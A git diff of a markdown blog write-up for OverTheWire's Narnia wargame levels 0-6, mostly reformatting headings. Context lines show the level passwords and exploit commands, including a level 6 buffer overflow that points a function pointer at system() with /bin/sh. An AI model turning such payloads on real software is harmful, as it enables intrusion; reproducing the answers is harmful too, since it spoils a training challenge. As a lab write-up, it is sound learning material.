@@ -1,6 +1,14 @@
-# Narnia
+---
+title: OverTheWire Narnia Level 0-6
+layout: post
+---
 
-## level 0
+* TOC
+{:toc}
+
+More information is available [here](http://overthewire.org/wargames/narnia/).
+
+# 1. Level 0
 
 ```
 $ ssh narnia0@narnia.labs.overthewire.org
@@ -45,7 +53,7 @@ val: 0xdeadbeef
 efeidiedae
 ```
 
-## level 1
+# 2. Level 1
 
 ```
 $ cat /games/narnia/narnia1.c
@@ -80,7 +88,7 @@ $ cat /etc/narnia_pass/narnia2
 nairiepecu
 ```
 
-## level 2
+# 3. Level 2
 
 ```
 $ cat /games/narnia/narnia2.c
@@ -114,7 +122,7 @@ $ cat /etc/narnia_pass/narnia3
 vaequeezee
 ```
 
-## level 3
+# 4. Level 3
 
 ```
 $ cat /games/narnia/narnia3.c
@@ -165,7 +173,7 @@ int main(int argc, char **argv){
 }
 ```
 
-Overwrite ```ofile``` with ```/tmp/ving/n4ps```.
+Overwrite `ofile` with `/tmp/ving/n4ps`.
 
 ```
 $ mkdir -p /tmp/ving/narnia3---------------/tmp/ving
@@ -183,7 +191,7 @@ $ cat /tmp/ving/n4ps
 thaenohtai
 ```
 
-## level 4
+# 5. Level 4
 
 ```
 $ cat /games/narnia/narnia4.c
@@ -220,7 +228,7 @@ $ cat /etc/narnia_pass/narnia5
 faimahchiy
 ```
 
-## level 5
+# 6. Level 5
 
 ```
 $ cat /games/narnia/narnia5.c
@@ -263,7 +271,7 @@ $ cat /etc/narnia_pass/narnia6
 neezocaeng
 ```
 
-## level 6
+# 7. Level 6
 
 ```
 $ cat /games/narnia/narnia6.c
@@ -308,13 +316,13 @@ int main(int argc, char *argv[]){
 }
 ```
 
-After the binary begins to execute the ```system()``` function is loaded, since it is part of the ```stdlib.h```.
+After the binary begins to execute the `system()` function is loaded, since it is part of the `stdlib.h`.
 
 ```
 $ /games/narnia/narnia6 `python -c 'print "A"*8+"\x70\x1e\xe6\xf7"'` `python -c 'print "B"*8+"/bin/sh"'`
 ```
 
-```argv[1]``` overwrites ```fp``` with ```system()``` function, and ```argv[2]``` overwrites ```b1``` with ```/bin/sh```.
+`argv[1]` overwrites `fp` with `system()` function, and `argv[2]` overwrites `b1` with `/bin/sh`.
 
 ```
 $ cat /etc/narnia_pass/narnia7
